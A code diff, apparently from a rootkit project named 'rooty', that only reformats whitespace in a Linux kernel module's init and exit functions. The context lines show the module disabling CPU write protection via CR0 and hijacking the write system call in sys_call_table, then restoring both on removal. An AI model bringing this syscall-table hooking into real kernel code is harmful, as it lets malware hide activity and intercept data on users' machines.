@@ -78,7 +78,7 @@ int rooty_init(void) {
   write_cr0(read_cr0() & (~ 0x10000)); 
   
   /* write hijack */
-  o_write = (void *)xchg(&sys_call_table[__NR_write],rooty_write); 
+  o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write); 
   
   /* turn WP back on */
   write_cr0(read_cr0() | 0x10000); 
@@ -89,9 +89,9 @@ int rooty_init(void) {
 void rooty_exit(void) {
   
   /* change back to before rooty execution */
-   write_cr0(read_cr0() & (~ 0x10000));
- xchg(&sys_call_table[__NR_write],o_write);
- write_cr0(read_cr0() | 0x10000);
+    write_cr0(read_cr0() & (~ 0x10000));
+    xchg(&sys_call_table[__NR_write],o_write);
+    write_cr0(read_cr0() | 0x10000);
   
   printk("rooty: module removed\n");
 }
